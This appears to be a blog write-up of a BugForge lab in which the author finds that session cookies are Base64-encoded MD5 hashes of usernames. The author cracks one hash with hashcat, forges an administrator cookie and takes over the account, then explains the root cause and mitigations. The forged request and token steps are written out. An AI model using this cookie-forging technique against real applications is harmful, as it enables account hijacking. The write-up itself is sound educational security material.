---
title: "Weak Session Token Design – Predictable MD5-Based Session Hijacking | CopyPasta"
date: 2026-05-07 00:00:00 +0530
categories: [Web Security]
tags: [Session Hijacking, Weak Session Management, MD5, Base64, Authentication, Cookie Security, Hashcat, BugForge]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/predictable-session-management.webp
  alt: Weak MD5-Based Session Token Vulnerability
---

## Overview

This lab demonstrated a critical flaw in session management where the application used a predictable authentication mechanism for session tokens.

Instead of generating cryptographically secure random session identifiers, the application created session cookies by:

1. Taking the username
2. Converting it into an MD5 hash
3. Encoding the hash using Base64
4. Storing it directly inside the `session` cookie

Because of this design flaw, it became possible to generate valid session cookies for arbitrary users, including the administrator account, resulting in full authentication bypass and account takeover.

---

## Objective

The objective was to analyze the application's authentication mechanism and gain unauthorized access to the administrator account.

---

## Reconnaissance

After creating a new user account, I began inspecting authenticated requests using Burp Suite Intruder and Proxy.

One of the authenticated requests contained the following cookie:

```http
GET /api/snippets/public HTTP/2
Host: lab-1778203810909-5bysim.labs-app.bugforge.io
Cookie: session=YjJjNmRlNTEwZDU4NDQ4NGQ3NGM5YWE5ZjhmYTlmMDQ%3D
```

The value looked encoded rather than randomly generated.

The `%3D` at the end indicated URL encoding for `=`, which is commonly seen in Base64 strings.

---

## Decoding the Session Token

After Base64 decoding the session cookie, the following value was revealed:

```
b2c6de510d584484d74c9aa9f8fa9f04
```

The format strongly resembled an MD5 hash because:

- MD5 hashes are 32 hexadecimal characters
- The value matched the exact structure

At this point, the hypothesis was:

> The application may be using MD5 hashes directly as session identifiers.

---

## Cracking the Hash

To identify what the MD5 hash represented, I used Hashcat with the RockYou wordlist.

```bash
hashcat -m 0 b2c6de510d584484d74c9aa9f8fa9f04 /usr/share/wordlists/rockyou.txt
```

Hashcat successfully cracked the hash:

```
b2c6de510d584484d74c9aa9f8fa9f04:kelvin
```

This confirmed the application was generating session identifiers as:

```
MD5(username)
```

This was a severe vulnerability because usernames are predictable and easy to guess.

---

## Exploitation

If the session token was simply the MD5 hash of the username, then it should be possible to generate a valid session for any user.

The next target was the administrator account.

### Generating the Admin Session

Using CyberChef, I generated the MD5 hash for the username `admin`.

```
21232f297a57a5a743894a0e4a801fc3
```

Then I encoded the MD5 hash into Base64.

```
MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
```

This value was then inserted into the `session` cookie.

### Forged Request

```http
GET /api/snippets/public HTTP/2
Host: lab-1778203810909-5bysim.labs-app.bugforge.io
Cookie: session=MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/plain, */*
```

---

## Proof of Exploitation

The server accepted the forged session token and authenticated the request as the administrator user.

The response contained the challenge flag:

```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Flag: bug{QZCilBlxQxEYvGgIMIU9joTB0u5XlqXD}
```

This confirmed successful account takeover through predictable session token generation.

---

## Root Cause Analysis

The vulnerability existed because the application violated multiple session management security principles.

**1. Predictable Session Tokens**

The application used deterministic values:

```
session = Base64(MD5(username))
```

Since usernames are predictable, attackers could generate valid sessions without interacting with authentication systems.

**2. No Server-Side Session Validation**

The server appeared to trust the cookie entirely without verifying:

- Session ownership
- Session expiration
- Session integrity
- Cryptographic signatures

This effectively turned the session cookie into a client-side authentication token.

**3. Use of MD5 for Security Logic**

MD5 is not suitable for authentication or session management because:

- It is fast to brute force
- It is deterministic
- It is vulnerable to collisions
- It provides no secrecy

Hashing public data does not make it secure.

---

## Impact

An attacker could:

- Hijack arbitrary accounts
- Impersonate administrators
- Access sensitive data
- Bypass authentication entirely
- Escalate privileges without credentials

Because usernames are often enumerable, exploitation becomes trivial.

---

## Real-World Insight

This vulnerability is a classic example of developers confusing:

```
Encoding != Encryption
Hashing != Authentication
```

Base64 only changes representation and provides zero security.

Similarly, hashing predictable values like usernames does not create secure session identifiers.

Modern session management should always use:

- Cryptographically secure random tokens
- Server-side session storage
- Signed or encrypted tokens
- Proper expiration and rotation

---

## Mitigation

**Secure Session Generation**

Applications should generate session tokens using cryptographically secure random values.

```python
session = secrets.token_hex(32)
```

**Use Signed Sessions**

Framework-managed secure sessions should be used instead of custom authentication logic.

Examples:

- JWT with proper signing
- Secure server-side session stores
- Signed cookies

**Never Use Predictable Data**

Usernames, emails, IDs, or hashes of public values should never be used directly as authentication tokens.

---

## Key Takeaways

- Base64 is reversible and provides no protection
- MD5 hashes are predictable when based on known input
- Session tokens must be random and unguessable
- Client-side trust leads to authentication bypass
- Weak session design can result in complete compromise